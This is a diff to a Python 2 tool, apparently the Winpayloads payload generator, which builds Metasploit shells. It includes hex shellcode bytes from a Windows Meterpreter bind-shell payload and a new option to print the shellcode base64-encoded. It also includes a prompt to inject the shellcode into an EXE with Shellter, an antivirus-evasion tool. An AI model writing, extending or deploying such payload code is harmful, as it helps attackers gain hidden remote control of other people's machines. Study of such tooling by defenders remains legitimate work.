@@ -23,7 +23,6 @@ try:
     IP = s.getsockname()[0]
 except:
     iperror = True
-    print 'Error Getting Ip Automatically'
 
 
 def ServePayload(payloaddirectory):
@@ -161,10 +160,7 @@ windows_met_bind_shell = (
     "\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f"
     "\xff\xd5\x83\xf8\x00\x7e\x07\x01\xc3\x29\xc6\x75\xe9\xc3")
 
-linux_x86_met_rev_shell = ('%s%s')
-
-
-payload, payloadchoice, payloaddir, ez2read_shellcode = '', '', '/etc/winpayloads', ''
+payload, payloadchoice, payloaddir, ez2read_shellcode, nullbytecount, powershellpayload, countforchar = '', '', '/etc/winpayloads', '', 0 , '', 0
 try:
     os.mkdir(payloaddir)
 except OSError:
@@ -211,6 +207,7 @@ try:
             if len(ipaddr) is 0:
                 ipaddr = IP
         else:
+            print t.bold_red + 'Error Getting Ip Automatically'
             ipaddr = raw_input(
             '\n[*] Press Enter Your IP Manually(Automatic Disabled)\n[*] IP> ')
 
@@ -233,8 +230,11 @@ try:
         ez2read_shellcode += '\\x%s' % byte.encode('hex')
 
     if menuchoice == '4':
-        print '=' * int((t.width / 2)-5) + 'SHELLCODE' + '=' * int((t.width / 2)-4) + '\n' + ez2read_shellcode + '\n' + '=' * t.width
-        sys.exit(0)
+        raw_b64encode = raw_input('[*] Base64 Encode Raw Payload? y/[n]: ')
+        if raw_b64encode.lower() == 'y':
+            print '=' * int((t.width / 2)-5) + 'SHELLCODE' + '=' * int((t.width / 2)-4) + '\n' + base64.b64encode(shellcode) + '\n' + '=' * t.width
+        elif raw_b64encode.lower() == 'n' or raw_b64encode == '':
+            print ez2read_shellcode
 
     want_to_payloadinexe = raw_input(
         '[*] Inject Shellcode Into an EXE (Shellter)? y/[n]: ')
